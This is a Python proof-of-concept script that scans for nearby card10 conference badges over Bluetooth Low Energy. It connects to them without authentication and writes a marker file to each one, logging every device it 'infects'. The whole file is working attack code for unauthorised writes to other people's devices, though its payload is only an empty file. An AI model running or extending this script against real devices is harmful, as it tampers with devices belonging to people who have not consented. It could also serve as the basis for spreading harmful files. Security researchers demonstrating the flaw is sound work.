#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Copyright 2019 Gerhard Klostermeier (@iiiikarus)
#


from threading import Thread
from bluepy.btle import Scanner, Peripheral, BTLEManagementError
from time import sleep


# Config.
OPEN_OR_CREATE_FILE = b's'
WRITE_FILE          = b'c'
SAVE_FILE           = b'f'
FILE_NAME           = b"/@IIIIkarusWasHere"  # limited to about 18 chars.
SCAN_TIME           = 3.0
MINIMUM_RSSI        = -85
CONNECTION_TIMOUT   = 5
BT_INTERFACE_INDEX  = 0 # 0 = /dev/hci0, 1 = /dev/hci1, etc.
DEBUG               = True


# Global vars. Yes, I know they are ugly...
connection_error = False


# Show output if DEBUG is True.
def log(text, force=False):
    if DEBUG or force:
        print(text)


# Scan for BLE devices for SCAN_TIME seconds.
def scan():
    scanner = Scanner(BT_INTERFACE_INDEX)
    log(f"[*] Starting scanner for {SCAN_TIME} seconds.")
    devices = scanner.scan(SCAN_TIME)
    log(f"[*] Scan finished. Found {len(devices)} devices.")
    return devices


# Connect to addr using peripheral.
def connect(peripheral, addr):
    global connection_error
    try:
        peripheral.connect(addr)
    except:
        connection_error = True


# "infect" (drop of a file) on dev.
def infect(dev):
    global connection_error
    infected = False
    # Connect.
    try:
        log(f"[*] Connecting to {dev.addr}.")
        peripheral = Peripheral(iface=BT_INTERFACE_INDEX)
        connection_error = False
        # Ugly hack to control the connection timout (only possible with threads).
        thread = Thread(target=connect, args=[peripheral, dev.addr])
        thread.start()
        thread.join(CONNECTION_TIMOUT)
        if thread.is_alive() or connection_error:
            raise Exception()
    except KeyboardInterrupt:
        raise
    except:
        try:
            peripheral.disconnect()
        except:
            pass
        log("[-] Could not connect.")
        return False

    # Check for service.
    try:
        service = peripheral.getServiceByUUID(
            "42230100-2342-2342-2342-234223422342")
        characteristic = service.getCharacteristics(
            "42230101-2342-2342-2342-234223422342")[0]
    except:
        log("[-] Service or characteristic not found. Not a card10 or connection lost.")
        return False

    # Write file.
    try:
        log("[*] Trying to write file.")
        data = OPEN_OR_CREATE_FILE + FILE_NAME
        characteristic.write(data)
        # Sleep is needed if the device was already paired (e.g. to a mobile phone) before.
        # Without the sleep the file will not be saved. I don't know why...
        sleep(0.1)
        #data = WRITE_FILE + b"test"
        # characteristic.write(data)
        data = SAVE_FILE
        characteristic.write(data)
        log(f"[+] File written to {dev.addr}.", True)
        infected = True
    except:
        log("[-] Error on writing.")
        return False

    # Disconnect.
    peripheral.disconnect()
    return infected


# Main loop.
infected_devices = []
try:
    while True:
        devices = scan()
        for dev in devices:
            # Is device close enough?
            if dev.rssi < MINIMUM_RSSI:
                continue
            # Had the device a card10 MAC? (ca:4d:10:xx:xx:xx)?
            if dev.addr[:8] != "ca:4d:10":
                continue
            # Is the device already infected?
            if dev.addr in infected_devices:
                continue
            # Infect (in thread to reduce connection timeout).
            if infect(dev):
                infected_devices.append(dev.addr)
except KeyboardInterrupt:
    print("")
    log("[*] Shutting down.")
except BTLEManagementError:
    log("[-] Bluetooth interface is powered down.", True)
finally:
    if len(infected_devices) > 0:
        log("[*] The following devices have been infected:", True)
    for dev in infected_devices:
        log(f"[+] Infected device {dev}.", True)
